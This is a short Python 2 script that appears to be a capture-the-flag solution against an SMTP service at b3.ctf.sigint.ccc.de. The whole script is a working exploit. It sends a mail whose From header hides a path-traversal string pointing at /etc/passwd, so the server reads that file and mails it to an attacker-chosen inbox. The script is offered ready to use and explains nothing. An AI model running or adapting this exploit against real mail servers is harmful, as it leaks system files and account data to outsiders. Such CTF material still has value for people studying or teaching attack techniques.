#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import socket
 
# put your own functional email address here
receiver = 'YOU@DOMAIN'
 
s = socket.socket()
print 'Connecting...'
s.connect(('b3.ctf.sigint.ccc.de', 25))
 
 
def send(msg):
    print msg
    s.send(msg + '\n')
    data = s.recv(1024)
    print data
    return data
 
#send a mail via tcp
print s.recv(1024)
send('helo b3.ctf.sigint.ccc.de')
send('mail from: hans@ck.er')
send('rcpt to: test@b3.ctf.sigint.ccc.de')
send('data')
send('''from: hans<hans/../user/../../../../etc/@ck.er>, hacker<%s>
to: test<test@b3.ctf.sigint.ccc.de>
subject: get passwd
.''' % receiver)
s.close()
 
print 'Connection closed.'
print 'Now check Inbox of %s and enjoy the flag.' % receiver
